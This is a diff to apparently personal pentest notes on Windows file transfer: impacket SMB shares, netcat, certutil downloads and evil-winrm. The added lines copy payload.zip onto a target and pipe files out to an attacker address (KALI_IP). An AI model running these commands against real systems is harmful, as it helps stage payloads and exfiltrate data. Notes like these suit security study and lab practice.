@@ -21,6 +21,7 @@ cmd prompt
 certutil -urlcache -split -f URL OUTPUTFILE
 ```
 ## SMB
+### setup
 server (linux)
 ```
 impacket-smbserver test . -smb2support  -username kourosh -password kourosh
@@ -30,7 +31,27 @@ client (windows)
 ```
 net use m: \\KALI_IP\test /user:kourosh kourosh
 ```
+### upload
+cmd
+```
+copy C:\Users\user\Desktop\payload.zip m:\
+```
 
+powershell
+```
+Copy-Item -Path "C:\Users\user\Desktop\payload.zip" -Destination "m:\"
+```
+
+### download
+cmd
+```
+copy m:\secret.txt C:\Users\Public\
+```
+
+powershell
+```
+Copy-Item -Path "m:\secret.txt" -Destination "C:\Users\Public\"
+```
 ## webdav
 server(kali)
 ```
@@ -69,6 +90,7 @@ nc -nvlp 9999 < file.txt
 ```
 
 client (windows)
+cmd.exe
 ```
 C:\Tools\nc.exe -nv KALI_IP 9999 > file.txt
 ```
@@ -80,10 +102,15 @@ nc -nvlp 9999 > file.txt
 ```
 
 client (windows)
+cmd.exe
 ```
 nc.exe -nv KALI_IP 9999 < file.txt
 ```
 
+powershell
+```
+Get-Content .\FILE -Encoding Byte -ReadCount 0 | .\nc.exe -nv 192.168.x.x 5555
+```
 # evil-winrm
 download to current local directory
 ```
